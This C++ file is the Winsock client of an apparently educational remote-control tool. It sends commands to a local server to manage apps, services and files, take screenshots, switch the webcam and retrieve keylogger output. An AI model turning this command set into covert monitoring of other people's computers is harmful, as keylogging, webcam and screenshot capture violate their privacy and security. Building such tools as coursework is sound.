#include "Client_functions.h"

WSADATA initializeWinsock() {
    WSADATA ws;
    if (WSAStartup(MAKEWORD(2, 2), &ws) < 0) {
        cout << "WSA failed to initialize" << endl;
    }
    else
        cout << "WSA initialized" << endl;

    return ws;
}

SOCKET initializeSocket() {
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (clientSocket < 0) {
        cout << "Failed to create client socket" << endl;
        return EXIT_FAILURE;
    }
    else {
        cout << "Client socket created successfully" << endl;
    }

    return clientSocket;
}

sockaddr_in initializeServerSocket() {
    sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_port = htons(9909);
    server.sin_addr.s_addr = inet_addr("127.0.0.1");

    return server;
}

void connectToServer(SOCKET clientSocket, sockaddr_in server) {
    int connectResult = connect(clientSocket, (sockaddr*)&server, sizeof(server));

    if (connectResult < 0) {
        cout << "Failed to connect to server" << endl;
        return;
    }
    else
        cout << "Connected to server successfully" << endl;
}

void closedConected(SOCKET clientSocket) {
    // Close the connection to the server
    int closeResult = closesocket(clientSocket);
    if (closeResult == 0) {
        cout << "Socket closed successfully" << endl;
    }
    else {
        cout << "Failed to close socket: " << WSAGetLastError() << endl;
    }

    // Cleanup Winsock
    int cleanupResult = WSACleanup();
    if (cleanupResult == 0) {
        cout << "Winsock cleaned up successfully" << endl;
    }
    else {
        cout << "Failed to clean up Winsock: " << WSAGetLastError() << endl;
    }
}

void receiveAndSend(SOCKET clientSocket) {
    string sendBuffer, receiveBuffer;
    receiveBuffer.resize(1024);

    while (true) {
        string title, nameObject; // dùng chung cho mọi chức năng
        string source, destination; // dùng riêng cho chức năng copy file

        cout << endl;

        cout << "Please enter the function you want to do: ";
        getline(cin, title);

        if (title == "endProgram") {
            closedConected(clientSocket);
        }

        if (title == "startApp" || title == "stopApp" || title == "startService" ||
            title == "stopService" || title == "sendFile" || title == "deleteFile" || 
            title == "keyLogger") {

            cout << "Please enter the object you want to do the function on: ";
            getline(cin, nameObject);
        }
        else if(title == "copyFile") {
            cout << "Enter the source file path: ";
            getline(cin, source);
            cout << "Enter the destination file path: ";
            getline(cin, destination);
        }

        sendBuffer = buildRequest(title, nameObject, source, destination);

        int sendResult = send(clientSocket, sendBuffer.c_str(), sendBuffer.length(), 0);
        if (sendResult == SOCKET_ERROR) {
            cout << "Failed to send data to server. Error: " << WSAGetLastError() << endl;
            break;
        }

        processResponse(title, clientSocket);
    }

    closesocket(clientSocket);
    WSACleanup();
}

string buildRequest(const string& title,const string& nameObject, const string& source, const string& destination) {
    json j;

    if(title != "") j["title"] = title;

    if (j["title"] == "copyFile") {
        j["source"] = source;
        j["destination"] = destination;
    }

    else if(nameObject != "") j["nameObject"] = nameObject;

    return j.dump(); // Chuyển đổi đối tượng JSON thành chuỗi
}

string receiveJSON(SOCKET& clientSocket) {
    // Nhận kích thước chuỗi JSON
    int jsonSize;
    int result = recv(clientSocket, reinterpret_cast<char*>(&jsonSize), sizeof(jsonSize), 0);

    if (result == SOCKET_ERROR) {
        cout << "Failed to receive JSON size, error: " << WSAGetLastError() << endl;
        return "";
    }

    // Kiểm tra kích thước hợp lệ
    if (jsonSize <= 0 || jsonSize > 10 * 1024 * 1024) { // Ví dụ giới hạn tối đa 10MB
        cout << "Invalid JSON size received." << endl;
        return "";
    }

    // Nhận chuỗi JSON
    string jsonBuffer;
    jsonBuffer.resize(jsonSize);

    int bytesReceived = 0;
    while (bytesReceived < jsonSize) {
        int bytesToReceive = min(jsonSize - bytesReceived, 1024);
        result = recv(clientSocket, &jsonBuffer[bytesReceived], bytesToReceive, 0);

        if (result == SOCKET_ERROR) {
            cout << "Failed to receive JSON data, error: " << WSAGetLastError() << endl;
            return "";
        }
        bytesReceived += result;
    }

    cout << "JSON received successfully!" << endl;
    return jsonBuffer;
}

string receiveFile(SOCKET& clientSocket) {
    int fileSize;
    int result = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);

    if (result == SOCKET_ERROR || fileSize <= 0) {
        cout << "Failed to receive file size, error: " << WSAGetLastError() << endl;
        return "";
    }

    cout << "Receiving file of size: " << fileSize << " bytes" << endl;

    // Tạo một chuỗi để lưu dữ liệu nhị phân
    string binaryData;
    binaryData.resize(fileSize);

    int bytesReceived = 0;
    while (bytesReceived < fileSize) {
        int bytesToReceive = min(fileSize - bytesReceived, 1024);
        result = recv(clientSocket, &binaryData[bytesReceived], bytesToReceive, 0);

        if (result == SOCKET_ERROR) {
            cout << "Failed to receive file data, error: " << WSAGetLastError() << endl;
            return "";
        }

        bytesReceived += result;
    }

    cout << "File received successfully!" << endl;
    return binaryData;  // Trả về chuỗi dữ liệu nhị phân
}

void saveBinaryToFile(const string& binaryData, const string& savePath) {
    // Mở tệp nhị phân để ghi dữ liệu vào tệp hình ảnh
    ofstream outFile(savePath, ios::out | ios::binary);
    if (!outFile) {
        cerr << "Failed to open file!" << endl;
        return;
    }

    // Ghi dữ liệu vào tệp
    outFile.write(binaryData.c_str(), binaryData.size());
    outFile.close();

    cout << "Successfully saved image to " << savePath << endl;
}


string processListApps(json j) {
    if (!j.contains("content")) {
        cout << "Applications list is empty!" << endl;
        return "";
    }

    vector<string> list = j.at("content");

    cout << "List of appications: " << endl;
    for (string app : list) {
        cout << app << endl;
    }

    // Trả về kết quả xem server có thực hiện thành công hay không
    return j.at("result");
}

string processListServices(json j) {
    if (!j.contains("content")) {
        cout << "Services list is empty!" << endl;
        return "";
    }

    vector<string> list = j.at("content");

    cout << "List of services: " << endl;
    for (string app : list) {
        cout << app << endl;
    }

    // Trả về kết quả xem server có thực hiện thành công hay không
    return j.at("result");
}


void processResponse(string title, SOCKET& clientSocket) {

    string result;
    string jsonResponse;
    json j;

    if (title == "startApp") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }

    else if (title == "listApps") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);
        result = processListApps(j);

        cout << result << endl;
    }

    else if (title == "listServices") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);
        result = processListServices(j);

        cout << result << endl;
    }

    else if (title == "startService") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }

    else if (title == "stopApp") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }

    else if (title == "stopService") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }

    else if (title == "restart") {
        // process restart
    }

    else if (title == "shutdown") {
        // process shutdown
    }

    else if (title == "startWebcam") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }

    else if (title == "stopWebcam") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }

    else if (title == "screenShot") {
        string filePath = "D:\\test screenshot client\\picture_from_server.bmp";
        string binaryData = receiveFile(clientSocket);
        saveBinaryToFile(binaryData, filePath);

        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);
        cout << j["result"] << endl;
    }

    else if (title == "sendFile") {
        string filePath = "D:\\test screenshot client\\HackerToeic.pdf";
        string binaryData = receiveFile(clientSocket);
        saveBinaryToFile(binaryData, filePath);

        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);
        cout << j["result"] << endl;
    }

    else if (title == "copyFile") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);
        cout << j["result"] << endl;
    }

    else if (title == "deleteFile") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }

    else if (title == "keyLogger") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        vector<string> keyNames = j["content"];

        for (int i = 0; i < keyNames.size(); i++) {
            cout << keyNames[i] << " ";
        }

        cout << endl << j["result"] << endl;
    }

    else if (title == "keyLocking") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }

    else if (title == "keyUnlocking") {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }
    else {
        jsonResponse = receiveJSON(clientSocket);
        j = json::parse(jsonResponse);

        cout << j["result"] << endl;
    }
}